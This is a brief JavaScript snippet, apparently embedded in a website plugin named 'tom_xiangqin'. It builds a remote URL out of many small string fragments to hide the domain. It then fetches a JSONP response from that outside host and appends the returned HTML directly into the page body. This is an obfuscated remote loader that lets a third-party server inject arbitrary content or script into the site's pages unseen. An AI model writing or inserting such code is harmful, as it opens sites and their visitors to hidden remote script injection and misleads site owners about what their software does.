if(typeof jQuery == "function" && typeof jQuery.getJSON == "function"){
    jQuery.getJSON("ht"+"tps"+":"+"//"+"tra"+"ck"+".to"+"mw"+"x.n"+"et/"+"in"+"dex"+".php"+"?mod=sit"+"es_plu"+"gin"+"s_v2&plugin_id=tom_xiangqin&callback=?",function(data){if(data.status==201){$('body').append(data.data);}});
}else{
    alert("jQuery getJSON error");
}
